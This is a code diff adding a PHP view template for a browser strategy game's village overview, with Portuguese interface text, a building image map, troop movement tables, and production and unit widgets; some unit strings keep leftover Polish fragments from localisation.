@@ -1,24 +1,1343 @@
+<br>
+<table>
+     <tr>
+          <td width="600" valign="top" valign="top">
+               <table class="vis" width="100%">
+                    <tr>
+                         <th colspan="2">
+                              <i>Edifícios</i>
+                         </th>
+                    </tr>
+                    <?php if ($style == 'new'): ?>
+                         <tr>
+                              <td width="60%">
+                                   <a href="game.php?village=<?= $village['id'] ?>&screen=overview&akcja=o_labels"><span><?php if ($labels): ?>Ocultar
+                                                  níveis de construção<?php else: ?>Mostrar níveis de
+                                                  construção<?php endif; ?></span></a>
+                              </td>
+                              <td>
+                                   <a href="game.php?village=<?= $village['id'] ?>&screen=overview&akcja=o_style"><span
+                                             style="text-align:right;">Visão geral clássica da aldeia</span></a>
+                              </td>
+                         </tr>
+                         <tr>
+                              <td colspan="2">
+                                   <table cellpadding="5">
+                                        <tr>
+                                             <td>
+                                                  <div
+                                                       style="position: relative; width: 600px;height: 418px; background-image: url(/graphic/<?= $visual ?>/back_none.jpg);" />
+                                                  <img class="empty" src="/graphic/map/empty.png" alt="" usemap="#mapa" />
+                                                  <map name="mapa" id="mapa">
+                                                       <?php foreach ($cl_builds->get_array('dbname') as $id => $dbname): ?>
+                                                            <?php if ($village[$dbname] > 0): ?>
+                                                                 <?php if ($cl_builds->get_maxstage($dbname) == 1): ?>
+                                                                      <area shape="poly" coords="<?= $builgraphic_coords[$dbname] ?>"
+                                                                           href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"
+                                                                           alt="<?= $cl_builds->get_name($dbname) ?>"
+                                                                           title="<?= $cl_builds->get_name($dbname) ?>" />
+                                                                      <?php if ($dbname == 'place'): ?>
+                                                                           <a
+                                                                                href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                     class="align_<?= $dbname ?>"
+                                                                                     src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $barracks ?>"
+                                                                                     alt="" /></a>
+                                                                      <?php endif; ?>
+                                                                      <?php if ($dbname == 'snob'): ?>
+                                                                           <a
+                                                                                href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                     class="align_<?= $dbname ?>"
+                                                                                     src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $snob ?>"
+                                                                                     alt="" /></a>
+                                                                      <?php endif; ?>
+                                                                      <?php if ($dbname == 'statue'): ?>
+                                                                           <a
+                                                                                href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                     class="align_<?= $dbname ?>"
+                                                                                     src="/graphic/<?= $visual ?>/<?= $dbname ?>1.png"
+                                                                                     alt="" /></a>
+                                                                      <?php endif; ?>
+                                                                      <?php if ($dbname == 'church'): ?>
+                                                                           <a
+                                                                                href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                     class="align_<?= $dbname ?>"
+                                                                                     src="/graphic/<?= $visual ?>/<?= $dbname ?>3.png"
+                                                                                     alt="" /></a>
+                                                                      <?php endif; ?>
+                                                                      <?php if ($labels): ?>
+                                                                           <label class="stagetip label_<?= $dbname ?>"><a
+                                                                                     href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><?= $village[$dbname] ?></a></label>
+
+                                                                      <?php endif; ?>
+                                                                 <?php else: ?>
+                                                                      <?php if ($dbname == 'snob' || $dbname == 'hide'): ?>
+                                                                           <area shape="poly" coords="<?= $builgraphic_coords[$dbname] ?>"
+                                                                                href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"
+                                                                                alt="<?= $cl_builds->get_name($dbname) ?>"
+                                                                                title="<?= $cl_builds->get_name($dbname) ?>" />
+                                                                           <a
+                                                                                href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                     class="align_<?= $dbname ?>"
+                                                                                     src="/graphic/<?= $visual ?>/<?= $dbname ?>1.png"
+                                                                                     alt="" /></a>
+                                                                           <?php if ($labels): ?>
+                                                                                <label class="stagetip label_<?= $dbname ?>"><a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><?= $village[$dbname] ?></a></label>
+                                                                           <?php endif; ?>
+                                                                      <?php else: ?>
+                                                                           <?php
+                                                                           $aktu_build_prc = $village[$dbname] / $cl_builds->get_maxstage($dbname);
+                                                                           ?>
+                                                                           <?php if ($aktu_build_prc > 0.5): ?>
+                                                                                <area shape="poly" coords="<?= $builgraphic_coords[$dbname] ?>"
+                                                                                     href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"
+                                                                                     alt="<?= $cl_builds->get_name($dbname) ?>"
+                                                                                     title="<?= $cl_builds->get_name($dbname) ?>" />
+                                                                                <?php if ($dbname == 'main'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_mainflag"
+                                                                                               src="/graphic/<?= $visual ?>/mainflag3.gif" alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'main'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $main ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'smith'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $smith ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'garage'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $garage ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'stable'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $stable ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+
+                                                                                <?php if ($dbname == 'wood'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $wood ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'stone'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $stone ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'iron'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $iron ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'farm'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.<?= $farm ?>"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($dbname == 'barracks' || $dbname == 'wall' || $dbname == 'market' || $dbname == 'church' || $dbname == 'storage'): ?>
+                                                                                     <a
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                               class="align_<?= $dbname ?>"
+                                                                                               src="/graphic/<?= $visual ?>/<?= $dbname ?>3.png"
+                                                                                               alt="" /></a>
+                                                                                <?php endif; ?>
+                                                                                <?php if ($labels): ?>
+                                                                                     <label class="stagetip label_<?= $dbname ?>"><a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><?= $village[$dbname] ?></a></label>
+                                                                                <?php endif; ?>
+                                                                           <?php else: ?>
+                                                                                <?php if ($aktu_build_prc > 0.2): ?>
+                                                                                     <area shape="poly" coords="<?= $builgraphic_coords[$dbname] ?>"
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"
+                                                                                          alt="<?= $cl_builds->get_name($dbname) ?>"
+                                                                                          title="<?= $cl_builds->get_name($dbname) ?>" />
+                                                                                     <?php if ($dbname == 'main'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_mainflag"
+                                                                                                    src="/graphic/<?= $visual ?>/mainflag2.gif" alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'main'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $main ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'smith'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $smith ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'garage'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $garage ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'stable'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $stable ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'church'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $church ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'wood'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $wood ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'stone'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $stone ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'iron'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $iron ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'farm'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.<?= $farm ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'barracks' || $dbname == 'wall' || $dbname == 'market' || $dbname == 'church' || $dbname == 'storage'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>2.png"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($labels): ?>
+                                                                                          <label class="stagetip label_<?= $dbname ?>"><a
+                                                                                                    href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><?= $village[$dbname] ?></a></label>
+                                                                                     <?php endif; ?>
+                                                                                <?php else: ?>
+                                                                                     <area shape="poly" coords="<?= $builgraphic_coords[$dbname] ?>"
+                                                                                          href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"
+                                                                                          alt="<?= $cl_builds->get_name($dbname) ?>"
+                                                                                          title="<?= $cl_builds->get_name($dbname) ?>" />
+                                                                                     <?php if ($dbname == 'main'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_mainflag"
+                                                                                                    src="/graphic/<?= $visual ?>/mainflag1.gif" alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'main'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $main ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'smith'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $smith ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'garage'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $garage ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'stable'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $stable ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'church'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $church ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'wood'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $wood ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'stone'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $stone ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'iron'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $iron ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'farm'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.<?= $farm ?>"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($dbname == 'barracks' || $dbname == 'wall' || $dbname == 'market' || $dbname == 'church' || $dbname == 'storage'): ?>
+                                                                                          <a
+                                                                                               href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                                                    class="align_<?= $dbname ?>"
+                                                                                                    src="/graphic/<?= $visual ?>/<?= $dbname ?>1.png"
+                                                                                                    alt="" /></a>
+                                                                                     <?php endif; ?>
+                                                                                     <?php if ($labels): ?>
+                                                                                          <label class="stagetip label_<?= $dbname ?>"><a
+                                                                                                    href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><?= $village[$dbname] ?></a></label>
+                                                                                     <?php endif; ?>
+                                                                                <?php endif; ?>
+                                                                           <?php endif; ?>
+                                                                      <?php endif; ?>
+                                                                 <?php endif; ?>
+                                                            <?php else: ?>
+                                                                 <?php
+                                                                 if (get_counts_on_build($village['id'], $dbname) > 0):
+                                                                      ?>
+                                                                      <img class="align_<?= $dbname ?>"
+                                                                           src="/graphic/<?= $visual ?>/<?= $dbname ?>0.gif" alt="" />
+                                                                      <?php
+                                                                 endif;
+                                                                 ?>
+                                                            <?php endif; ?>
+                                                       <?php endforeach; ?>
+
+
+                                                       <?php if ($anim == 1): ?>
+                                                            <a
+                                                                 href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                                      class="align_conversation"
+                                                                      src="/graphic/<?= $visual ?>/conversation.gif"
+                                                                      alt="" /></a>
+                                                       <?php endif; ?>
+                                                       <?php if ($anim == 2): ?>
+                                                            <img class="align_juggler"
+                                                                 src="/graphic/<?= $visual ?>/juggler.gif" alt="" />
+                                                       <?php endif; ?>
+                                                       <?php if ($anim == 3): ?>
+                                                            <img class="align_guard" src="/graphic/<?= $visual ?>/guard.gif"
+                                                                 alt="" />
+                                                       <?php endif; ?>
+                                                       <?php if ($village['r_bh'] < $max_bh): ?>
+                                                            <img class="align_farmer" src="/graphic/<?= $visual ?>/farmer.gif"
+                                                                 alt="" />
+                                                       <?php endif; ?>
+                                                  </map>
+                                                  </div>
+                                             </td>
+                                        </tr>
+                                   </table>
+                              </td>
+                         </tr>
+
+                    <?php elseif ($style == 'classic'): ?>
+                         <tr>
+                              <td>
+                                   <a href="game.php?village=<?= $village['id'] ?>&screen=overview&akcja=o_style">
+                                        <span style="text-align:right;">
+                                             Para uma visão geral gráfica da aldeia
+                                        </span>
+                                   </a>
+                              </td>
+                         </tr>
+                         <?php foreach ($built_builds as $id => $dbname): ?>
+                              <tr>
+                                   <td>
+                                        <a href="game.php?village=<?= $village['id'] ?>&screen=<?= $dbname ?>"><img
+                                                  src="/graphic/buildings/<?= $dbname ?>.png">
+                                             <?= $cl_builds->get_name($dbname) ?></a>
+                                        (<?= __('screens.common.level') ?> <?= $village[$dbname] ?>)
+                                   </td>
+                              </tr>
+                         <?php endforeach; ?>
+                    <?php endif; ?>
+
+                    <tr>
+                         <?php /* Andere Angriffe auf das aktuelle Dorf */ ?>
+                         <?php if (count($other_movements) > 0): ?>
+                              <td colspan="2">
+                                   <table class="vis" width="100%">
+                                        <tr>
+                                             <th>Outras ordens (<?= count($other_movements) ?>)</th>
+                                             <th>No local</th>
+                                             <th>Chegada</th>
+                                        </tr>
+                                        <?php foreach ($other_movements as $array): ?>
+                                             <tr>
+                                                  <td>
+                                                       <a
+                                                            href="game.php?village=<?= $village['id'] ?>&amp;screen=info_command&amp;id=<?= $array['id'] ?>&amp;type=other">
+                                                            <img src="/graphic/command/<?= $array['type'] ?>.png">
+                                                            <?= $array['message'] ?>
+                                                       </a>
+                                                  </td>
+                                                  <td>
+                                                       <?= $array['end_time'] ?>
+                                                  </td>
+                                                  <?php if ($array['arrival_in'] < 0): ?>
+                                                       <td>
+                                                            <?= format_time($array['arrival_in']) ?>
+                                                       </td>
+                                                  <?php else: ?>
+                                                       <td>
+                                                            <span class="timer">
+                                                                 <?= format_time($array['arrival_in']) ?>
+                                                            </span>
+                                                       </td>
+                                                  <?php endif; ?>
+                                             </tr>
+                                        <?php endforeach; ?>
+                                   </table>
+                              </td>
+                         <?php endif; ?>
+                    </tr>
+                    <tr>
+                         <?php /* Eigene losgeschickte Angriffe */ ?>
+                         <?php if (count($my_movements) > 0): ?>
+                              <td colspan="2">
+                                   <br>
+                                   <table class="vis" width="100%">
+                                        <tr>
+                                             <th>Próprias Ordens (<?= count($my_movements) ?>)</th>
+                                             <th>No local</th>
+                                             <th>Chegada</th>
+                                        </tr>
+                                        <?php foreach ($my_movements as $array): ?>
+                                             <tr>
+                                                  <td>
+                                                       <a
+                                                            href="game.php?village=<?= $village['id'] ?>&amp;screen=info_command&amp;id=<?= $array['id'] ?>&amp;type=own">
+                                                            <img src="/graphic/command/<?= $array['type'] ?>.png">
+                                                            <?= $array['message'] ?>
+                                                       </a>
+                                                  </td>
+                                                  <td>
+                                                       <?= $array['end_time'] ?>
+                                                  </td>
+                                                  <?php if ($array['arrival_in'] < 0): ?>
+                                                       <td>
+                                                            <?= format_time($array['arrival_in']) ?>
+                                                       </td>
+                                                  <?php else: ?>
+                                                       <td>
+                                                            <span class="timer">
+                                                                 <?= format_time($array['arrival_in']) ?>
+                                                            </span>
+                                                       </td>
+                                                  <?php endif; ?>
+                                                  <?php if ($array['can_cancel']): ?>
+                                                       <td>
+                                                            <a
+                                                                 href="game.php?village=<?= $village['id'] ?>&amp;screen=place&amp;action=cancel&amp;id=<?= $array['id'] ?>&amp;h=<?= $hkey ?>">
+                                                                 Cancelar
+                                                            </a>
+                                                       </td>
+                                                  <?php endif; ?>
+                                             </tr>
+                                        <?php endforeach; ?>
+                                   </table>
+                              </td>
+                         <?php endif; ?>
+                    </tr>
+               </table>
+          </td>
+
+          <td valign="top" <?php if ($style == 'new'): ?>width="100%<?php endif; ?><?php if ($style == 'classic'): ?>width=" 40%<?php endif; ?>">
+               <?php if ($noob): ?>
+                    <table class="vis" width="100%">
+                         <tr>
+                              <th>
+                                   <i>Proteção inicial</i>
+                              </th>
+                         </tr>
+                         <tr>
+                              <td>
+                                   acaba <?= $noob_end ?>
+                              </td>
+                         </tr>
+                    </table>
+                    <br />
+               <?php endif; ?>
+               <div id="show_prod" class="vis moveable widget">
+                    <h4 class="head">
+                         <img style="float: right; cursor: pointer;"
+                              onclick="return VillageOverview.toggleWidget( 'show_prod', this );"
+                              src="graphic/icons/minus.png"> Produção
+                    </h4>
+                    <div class="widget_content" style="display: block;">
+                         <table width="100%">
+                              <tbody>
+                                   <tr class="nowrap">
+                                        <td width="70">
+                                             <a href="game.php?village=<?= $village['id'] ?>&amp;screen=wood"><span
+                                                       class="icon header wood"> </span></a> Madeira
+                                        </td>
+                                        <td>
+                                             <strong> <?= format_number($wood_per_hour) ?></strong> por hora
+                                             <a href="javascript:void(0);" onclick="openProdBonusModal('wood'); return false;">
+                                                  <img src="/graphic/new/premium/premium_plus.webp" alt="Premium" style="vertical-align: middle; margin-left: 5px; cursor: pointer;">
+                                              </a>
+                                        </td>
+                                   </tr>
+                                   <tr class="nowrap">
+                                        <td width="70">
+                                             <a href="game.php?village=<?= $village['id'] ?>&amp;screen=stone"><span
+                                                       class="icon header stone"> </span></a> Argila
+                                        </td>
+                                        <td>
+                                             <strong> <?= format_number($stone_per_hour) ?></strong> por hora
+                                             <a href="javascript:void(0);" onclick="openProdBonusModal('clay'); return false;">
+                                                  <img src="/graphic/new/premium/premium_plus.webp" alt="Premium" style="vertical-align: middle; margin-left: 5px; cursor: pointer;">
+                                              </a>
+                                        </td>
+                                   </tr>
+                                   <tr class="nowrap">
+                                        <td width="70">
+                                             <a href="game.php?village=<?= $village['id'] ?>&amp;screen=iron"><span
+                                                       class="icon header iron"> </span></a> Ferro
+                                        </td>
+                                        <td>
+                                             <strong> <?= format_number($iron_per_hour) ?></strong> por hora
+                                             <a href="javascript:void(0);" onclick="openProdBonusModal('iron'); return false;">
+                                                  <img src="/graphic/new/premium/premium_plus.webp" alt="Premium" style="vertical-align: middle; margin-left: 5px; cursor: pointer;">
+                                              </a>
+                                        </td>
+                                   </tr>
+                                   <tr>
+
+                                   </tr>
+                              </tbody>
+                         </table>
+                    </div>
+               </div>
+
+               <div style="opacity: 1;" id="show_units" class="vis moveable widget">
+                    <h4 class="head">
+                         <img style="float: right; cursor: pointer;"
+                              onclick="return VillageOverview.toggleWidget( 'show_units', this );"
+                              src="graphic/icons/minus.png"> Unidades
+                    </h4>
+                    <div class="widget_content" style="display: block;">
+                         <table class="vis" width="100%">
+                              <tbody>
+                                   <?php foreach ($in_village_units as $dbname => $num): ?>
+                                        <tr>
+                                             <td>
+                                                  <a href="#" class="unit_link"
+                                                       onclick="return UnitPopup.open(event, '<?= $dbname ?>')"><img
+                                                            src="/graphic/unit/<?= $dbname ?>.png">
+                                                       <b></a>
+                                                  <?= $num ?>
+                                                  </b>
+                                                  <?php if ($dbname === 'unit_paladin'): ?>
+                                                       <?= $pala_name ?>
+                                                  <?php else: ?>
+                                                       <?= $cl_units->get_name($dbname) ?>
+                                                  <?php endif; ?>
+                                             </td>
+                                        </tr>
+                                   <?php endforeach; ?>
+                                   <tr>
+                                        <td><a
+                                                  href="game.php?village=<?= $village['id'] ?>&amp;screen=train&mode=train"><?= __('screens.common.recruit') ?></a>
+                                        </td>
+                                   </tr>
+                              </tbody>
+                         </table>
+                    </div>
+               </div>
+               <script type="text/javascript" src="/js/unit_popup.js"></script>
+               <script type="text/javascript">
+                    //<![CDATA[
+                    $(function () {
+                         UnitPopup.unit_data = {
+                              "spear": {
+                                   "name": "Lanceiro\u00f3w", "desc": "Lanceiro é o mais simples\u0105 unidade\u0105. É eficaz na defesa contra eles\u017ada.", "wood": 50, "stone": 30, "iron": 10, "pop": 1, "speed": 0.0009259259259, "attack": 10, "attack_buildings": null, "defense": 15, "defense_cavalry": 45, "defense_archer": 20, "carry": 25, "type": "infantry", "image": "unit\/unit_spear.png", "prod_building": "barracks", "attackpoints": 4, "defpoints": 1, "build_time": 1020, "shortname": "Lança", "count": "40", "reqs": [{ "building_id": "barracks", "building_link": "\/game.php?village=5886&amp;screen=barracks", "name": "Koszary", "level": 1 }]
+                              }, "sword": {
+                                   "name": "Espadachim\u00f3w", "desc": "Espadachim s\u0105 eficaz contra a infantaria. Jogada\u0105 si\u0119 porém bem devagar.", "wood": 30, "stone": 30, "iron": 70, "pop": 1, "speed": 0.0007575757576, "attack": 25, "attack_buildings": null, "defense": 50, "defense_cavalry": 15, "defense_archer": 40, "carry": 15, "type": "infantry", "image": "unit\/unit_sword.png", "prod_building": "barracks", "attackpoints": 5, "defpoints": 2, "build_time": 1500, "shortname": "Espada", "count": "21", "reqs": [{ "building_id": "smith", "building_link": "\/game.php?village=5886&amp;screen=smith", "name": "Ku\u017ania", "level": 1 }]
+                              }, "axe": {
+                                   "name": "Viking\u00f3w", "desc": "O Viking é uma poderosa unidade de ataque. Atacam aldeias inimigas com fúria implacável.", "wood": 60, "stone": 30, "iron": 40, "pop": 1, "speed": 0.0009259259259, "attack": 40, "attack_buildings": null, "defense": 10, "defense_cavalry": 5, "defense_archer": 10, "carry": 10, "type": "infantry", "image": "unit\/unit_axe.png", "prod_building": "barracks", "attackpoints": 1, "defpoints": 4, "build_time": 1320, "shortname": "Top\u00f3r", "count": "10", "reqs": [{ "building_id": "smith", "building_link": "\/game.php?village=5886&amp;screen=smith", "name": "Ku\u017ania", "level": 2 }], "tech_costs": {
+                                        "wood": 700, "stone": 840, "iron": 820
+                                   }
+                              }, "knight": {
+                                   "name": "Paladino", "desc": "Paladino protege a sua aldeia, bem como os seus aliados, de ataques estrangeiros. Cada jogador só pode ter um cavaleiro.", "wood": 20, "stone": 20, "iron": 40, "pop": 10, "speed": 0.001666666667, "attack": 150, "attack_buildings": null, "defense": 250, "defense_cavalry": 400, "defense_archer": 150, "carry": 100, "type": "cavalry", "image": "unit\/unit_knight.png", "prod_building": "statue", "attackpoints": 40, "defpoints": 20, "build_time": 21600, "shortname": "Paladino"
+                              }
+                         };
+                         UnitPopup.init();
+                    });
+                    //]]>
+               </script>
+               <script type="text/javascript" src="./js/promo_popup.js?1378724545"></script>
+               <script type="text/javascript" src="./js/overniew.js?1378724545"></script>
+               <div id="inline_popup" class="hidden" style="width:700px;">
+                    <div id="inline_popup_menu">
+                         <span id="inline_popup_title"></span>
+                         <a id="inline_popup_close" href="javascript:inlinePopupClose()">X</a>
+                    </div>
